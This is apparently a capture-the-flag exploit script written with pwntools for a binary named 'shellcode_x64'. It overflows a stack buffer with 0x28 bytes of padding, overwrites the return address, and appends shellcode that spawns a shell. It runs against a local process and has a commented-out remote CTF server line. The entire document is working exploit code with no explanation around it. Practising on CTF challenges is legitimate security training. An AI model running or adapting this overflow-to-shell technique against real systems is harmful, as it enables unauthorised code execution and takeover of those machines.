from pwn import *

context(os='linux', arch='amd64')
elf = ELF('./shellcode_x64')

# r = remote("pwn1.0ops.sjtu.cn", 11001)
r = process('./shellcode_x64')

jmprbp = p64(0x000000000040072b)
gets = p64(0x400566)
bin_sh = asm(shellcraft.sh())

repeat = 0x28

payload = b'A' * repeat + gets + bin_sh

print(payload)

r.sendline(payload)

r.interactive()